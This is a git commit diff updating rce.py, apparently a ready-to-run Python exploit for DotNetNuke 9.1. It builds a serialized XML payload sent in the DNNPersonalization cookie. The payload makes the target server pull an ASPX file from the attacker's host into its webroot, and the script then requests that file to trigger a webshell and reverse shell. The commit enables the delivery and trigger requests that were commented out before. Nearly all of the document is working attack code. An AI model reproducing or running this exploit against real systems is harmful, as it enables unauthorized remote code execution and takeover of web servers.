e8e1f34fd24b4e82c01a5ba9a12e4b7654fda2dc
Matheus Alexandre <60984217+Xcatolin@users.noreply.github.com>
2023-04-23 19:55:01 -0300

    Update rce.py

--- DotNetNuke/rce.py
+++ DotNetNuke/rce.py
@@ -1,45 +1,42 @@
-import sys, requests
+import sys, requests, argparse
+
+proxies = {
+  "http": "http://127.0.0.1:8080",
+  "https": "https://127.0.0.1:8080",
+}
 
 def createObject(lhost, payloadFile):
-    object = '''<profile><item key="myTableEntry"
-type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.Fil
-eSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral,
-PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework,
-Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],
-System.Data.Services, Version=4.0.0.0, Culture=neutral,
-PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance
-xsi:type="FileSystemUtils"
-/><MethodName>PullFile</MethodName><MethodParameters><anyType
-xsi:type="xsd:string">http://%s/%s</anyType><anyType
-xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/%s</anyType></MethodParam
-eters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item
-></profile>''' % (lhost, payloadFile, payloadFile)
-    return object
+	print("\n[+] Crafting serialized payload...")
+	object = '''<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://%s/%s</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/%s</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>''' % (lhost, payloadFile, payloadFile)
+	return str(object)
 
-def delivery(ip, lhost, payloadFile):
-    s = requests.session()
-    target = "http://%s/dotnetnuke/" % ip
-    cookie = createObject(lhost, payloadFile)
-    headers = {'Cookie': cookie}
-    print("[+] Delivering ASPX payload file...")
-    #s.get(target + 'random', headers=headers)
-    print("[+] Attempting to access payload...")
-    # Access uploaded webshell and trigger revshell
-    #s.get(target + payloadFile)
+def delivery(ip, lhost, lport, payloadFile):
+	s = requests.session()
+	target = "http://%s/dotnetnuke/" % ip
+	cookie = createObject(lhost, payloadFile)
+	headers = {'Cookie': 'DNNPersonalization=' + cookie}
+	print("[+] ASPX payload file delivered")
+	s.get(target + 'random', headers=headers, proxies=proxies)
+	print("[+] Triggering payload...")
+	s.get(target + payloadFile, proxies=proxies)
 
 def main():
-    if len(sys.argv) != 2:
-        print("[!] Usage: python3 %s <target:port/app_path>" % sys.argv[0])
-        print("ex: python3 %s 192.168.1.100:8080/dotnetnuke\n" % sys.argv[0])
-        sys.exit(-1)
-    ip = sys.argv[1]
-    print("[+] Please insert your local IP address")
-    lhost = input()
-    print("[+] Please insert the name of your ASPX payload file")
-    payloadFile = input()
-    delivery(ip, lhost, payloadFile)
+	parser = argparse.ArgumentParser()
+	parser.add_argument('--ip', help='Target IP address', required=True)
+	parser.add_argument('--lhost', help='Local listener IP address', required=True)
+	parser.add_argument('--lport', help='Local listener port', required=True)
+	parser.add_argument('--payload', help='Payload file', required=True)
+	if len(sys.argv)<=1:
+		print("[!] Usage: python3 %s --ip 192.168.0.5:80/dotnetnuke --lhost 192.168.0.1 --lport 8080" % sys.argv[0])
+		parser.print_help()
+		sys.exit(-1)
+	args = parser.parse_args()
+	ip = args.ip
+	lhost = args.lhost
+	lport = args.lport
+	payloadFile = args.payload
+
+	delivery(ip, lhost, lport, payloadFile)
 
 if __name__ == "__main__":
 	main()
